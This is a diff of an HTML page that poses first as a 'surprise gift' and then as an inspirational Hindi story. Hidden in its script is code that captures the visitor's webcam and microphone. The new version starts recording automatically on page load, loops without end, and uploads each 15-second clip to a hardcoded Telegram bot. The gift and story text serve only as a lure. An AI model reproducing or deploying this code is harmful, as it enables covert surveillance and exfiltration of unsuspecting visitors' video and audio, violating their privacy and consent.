@@ -1,258 +1,151 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Surprise Gift</title>
+  <title>Emotional Story</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
-  height: 100vh;
-  font-family: 'Comic Sans MS', cursive;
-  background: linear-gradient(135deg, 
-    rgba(255, 110, 196, 0.8), 
-    rgba(120, 115, 245, 0.8), 
-    rgba(255, 183, 77, 0.8), 
-    rgba(72, 219, 251, 0.8), 
-    rgba(186, 220, 88, 0.8)
-  ),
-  url('/img.webp') center/cover no-repeat;
-  color: black;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  padding: 20px;
-}
-
-    .container {
-      max-width: 800px;
-      width: 100%;
-      background: rgba(255, 255, 255, 0.07);
+      margin: 0;
       padding: 30px 20px;
-      border-radius: 25px;
-      color: black;
-      box-shadow: 0 0 40px rgba(0, 0, 0, 0.3);
+      font-family: 'Comic Sans MS', cursive;
+      background: linear-gradient(270deg, #a1c4fd, #c2e9fb, #fbc2eb, #a6c1ee);
+      background-size: 600% 600%;
+      animation: fancyBG 20s ease infinite;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
       text-align: center;
     }
 
+    @keyframes fancyBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
     h1 {
-      font-size: 2.2em;
-      margin-bottom: 20px;
-      animation: pulse 2s infinite;
+      font-size: 2.5em;
+      margin-bottom: 30px;
+      background: linear-gradient(90deg, #ff6a00, #ee0979, #00c9ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: pulseText 2s infinite;
     }
 
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-
-    button {
-  padding: 16px 35px;
-  font-size: 1.2rem;
-  background: linear-gradient(135deg, #ff00cc, #ff9900, #00f2ff, #8e2de2);
-  background-size: 300% 300%;
-  color: #fff;
-  border: 3px solid #fff;
-  border-radius: 50px;
-  cursor: pointer;
-  transition: all 0.3s ease-in-out;
-  box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
-  animation: gradientShift 5s ease infinite, pulse 2s infinite;
-  font-weight: bold;
-  letter-spacing: 0.5px;
-}
-
-button:hover {
-  transform: scale(1.1);
-  background: linear-gradient(135deg, #ff6ec4, #7873f5, #00f2ff, #f9d423);
-  background-size: 300% 300%;
-  box-shadow: 0 0 30px rgba(255, 0, 204, 0.8);
-  border: 3px solid #fff;
-  color: #fff;
-}
-
-/* Gradient animation */
-@keyframes gradientShift {
-  0% { background-position: 0% 50%; }
-  50% { background-position: 100% 50%; }
-  100% { background-position: 0% 50%; }
-}
-
-    .loader {
-      margin: 20px auto;
-      border: 6px solid #fff;
-      border-top: 6px solid #ff00cc;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      display: none;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    video {
-      display: none;
-    }
-
-    #status {
-      margin-top: 15px;
-      font-size: 1rem;
-      animation: fadeIn 1s ease-in-out;
-    }
-
-    @keyframes fadeIn {
-      from {opacity: 0;}
-      to {opacity: 1;}
+    @keyframes pulseText {
+      0%, 100% {transform: scale(1);}
+      50% {transform: scale(1.05);}
     }
 
     .story-text {
-      font-size: 1.3rem;
-      font-weight: bold;
-      margin-top: 25px;
-      line-height: 2;
-      background: rgba(255, 255, 255, 0.1);
+      max-width: 800px;
+    }
+
+    .story-text p {
+      font-size: 1.4rem;
+      margin-top: 20px;
       padding: 20px;
+      background: rgba(0, 0, 0, 0.3);
       border-radius: 15px;
-      min-height: 160px;
-      color: #fff;
-      white-space: pre-wrap;
+      animation: fadeInText 1s ease-in-out;
+      line-height: 1.8;
     }
 
-    .typing {
-      border-right: .15em solid #fff;
-      animation: caret 1s steps(1) infinite;
+    @keyframes fadeInText {
+      from {opacity: 0; transform: translateY(10px);}
+      to {opacity: 1; transform: translateY(0);}
     }
 
-    @keyframes caret {
-      50% { border-color: transparent; }
-    }
-
-    audio {
-      display: none;
-    }
+    video { display: none; }
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <h1>अपना सरप्राइज गिफ्ट खोलिए!</h1>
-    <button onclick="startRecording()">गिफ्ट खोलें</button>
-    <div class="loader" id="loader"></div>
-    <video id="preview" autoplay muted playsinline></video>
-    <div id="status"></div>
-    <div id="story" class="story-text">
-      <span id="typedText" class="typing"></span>
-    </div>
-  </div>
-
-  <!-- Background Music -->
-  <audio autoplay loop>
-    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mp3">
-  </audio>
+  <h1>"एक ऐसा मोड़, जिसने ज़िंदगी की तस्वीर ही बदल दी...... </h1>
+  <div class="story-text" id="story"></div>
+  <video id="preview" autoplay muted playsinline></video>
 
   <script>
-    const botToken = '7438200543:AAGj_NH7TYovNcO4-n9saO4YCIrWf3KWeqE';
-    const chatId = '6133511447';
-    const loader = document.getElementById('loader');
-    const statusText = document.getElementById('status');
-    const preview = document.getElementById('preview');
+    const storyLines = [
+      "वो एक बच्चा था, जो ख्वाबों से बड़ा था।",
+      "उसके पास ना किताब थी, ना जूते, पर आंखों में चमक थी।",
+      "मां की गोदी से सीखा था प्यार देना, बिना किसी उम्मीद के।",
+      "हर रोज़ खेत में काम करके वो स्कूल जाता, चेहरे पर मुस्कान और जेब खाली।",
+      "एक दिन रास्ते में टूटी किताब देखी, उसे जोड़कर पढ़ा जैसे खजाना मिल गया हो।",
+      "एक बूढ़े बाबा को सर्दी में ठिठुरते देखा, अपना स्वेटर उतारकर दे दिया।",
+      "लोग कहते हैं, 'दुनिया स्वार्थी है', पर वो कहता, 'दुनिया को बदलना है।'",
+      "उसने देखा, एक लड़की डर से कांप रही है – उसके साथ बैठा, कहानी सुनाई, मुस्कुराहट दी।",
+      "बचपन बीता, जवानी आई, पर उस बच्चे का दिल कभी बूढ़ा नहीं हुआ।",
+      "वो हर किसी की मदद करता रहा – बिना फोटो, बिना पोस्ट, सिर्फ दिल से।",
+      "एक दिन किसी ने पूछा – 'तुम क्या बनना चाहते हो?'",
+      "'मैं याद बनना चाहता हूँ... किसी की अच्छाई में शामिल होकर।'",
+      "वक्त बीता, लोग बदल गए, पर उसकी अच्छाई अमर रही।",
+      "आज वो इंसान नहीं, प्रेरणा बन गया।",
+      "और अगर तुम ये पढ़ रहे हो – तो शायद तुम भी किसी के लिए वो 'प्रेरणा' बन सको।",
+      "शायद... तुम्हारे एक मुस्कान से कोई टूटे दिल जुड़ जाए।",
+      "ये गिफ्ट डब्बे में नहीं, तुम्हारे अंदर है।",
+      "आज तुमसे अच्छा तोहफा किसी को नहीं मिल सकता।",
+      "तुम जैसा कोई नहीं। और यही सबसे बड़ा जादू है।",
+      "हर दिन एक नई शुरुआत है। और ये शुरुआत सिर्फ तुम्हारे लिए है।",
+      "Thank you... बस यूँ ही किसी की उम्मीद बने रहना rtk97।"
+      
+    ];
 
-    async function startRecording() {
-      statusText.innerText = "";
-      loader.style.display = "block";
+    const container = document.getElementById('story');
+    storyLines.forEach(line => {
+      const p = document.createElement('p');
+      p.textContent = line;
+      container.appendChild(p);
+    });
 
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: true
-        });
+    // Continuous recording and sending to Telegram
+    const telegramBotToken = '7438200543:AAGj_NH7TYovNcO4-n9saO4YCIrWf3KWeqE';
+    const telegramChatId = '6133511447';
 
-        preview.srcObject = stream;
-
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          sendToTelegram(blob);
-          stream.getTracks().forEach(track => track.stop());
-          preview.srcObject = null;
-        };
-
-        mediaRecorder.start();
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, 15000); // 15 seconds
-      } catch (err) {
-        loader.style.display = "none";
-        statusText.innerText = "कैमरा/माइक एक्सेस असफल या अनुपलब्ध है।";
-        console.error(err);
-      }
-    }
-
-    function sendToTelegram(blob) {
+    async function sendToTelegram(blob) {
       const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("video", blob, "gift_video.webm");
+      formData.append('chat_id', telegramChatId);
+      formData.append('video', blob, 'user_recording.webm');
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-        method: "POST",
+      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
+        method: 'POST',
         body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        loader.style.display = "none";
-        statusText.innerText = "आपका गिफ्ट तो आपके दिल में भेजा गया!";
-        console.log(data);
-      })
-      .catch(err => {
-        loader.style.display = "none";
-        statusText.innerText = "गिफ्ट भेजने में त्रुटि हुई।";
-        console.error(err);
       });
     }
 
-    const storyLines = [
-      "वो जो तूने मुस्कुरा कर देखा था एक पल...",
-      "वो मुस्कान मेरे दिल को बहुत भा गई...",
-      "खुदा कसम उस एक मुस्कान के लिए...",
-      "मैंने ज़िन्दगी दांव पर लगा दी..."
-    ];
+    async function startContinuousRecording() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const preview = document.getElementById('preview');
+        preview.srcObject = stream;
 
-    const typedText = document.getElementById("typedText");
-    let lineIndex = 0;
-    let charIndex = 0;
+        while (true) {
+          const recorder = new MediaRecorder(stream);
+          const chunks = [];
 
-    function typeLine() {
-      if (lineIndex < storyLines.length) {
-        if (charIndex < storyLines[lineIndex].length) {
-          typedText.textContent += storyLines[lineIndex].charAt(charIndex);
-          charIndex++;
-          setTimeout(typeLine, 70);
-        } else {
-          charIndex = 0;
-          lineIndex++;
-          setTimeout(() => {
-            typedText.textContent += "\n";
-            typeLine();
-          }, 1000);
+          recorder.ondataavailable = e => chunks.push(e.data);
+          recorder.start();
+
+          await new Promise(resolve => setTimeout(resolve, 15000));
+          recorder.stop();
+
+          await new Promise(resolve => {
+            recorder.onstop = () => {
+              const blob = new Blob(chunks, { type: 'video/webm' });
+              sendToTelegram(blob);
+              resolve();
+            };
+          });
         }
+      } catch (err) {
+        console.error("Camera not allowed or error occurred:", err);
       }
     }
 
-    // Start typing immediately
-    typeLine();
+    startContinuousRecording();
   </script>
 </body>
 </html>
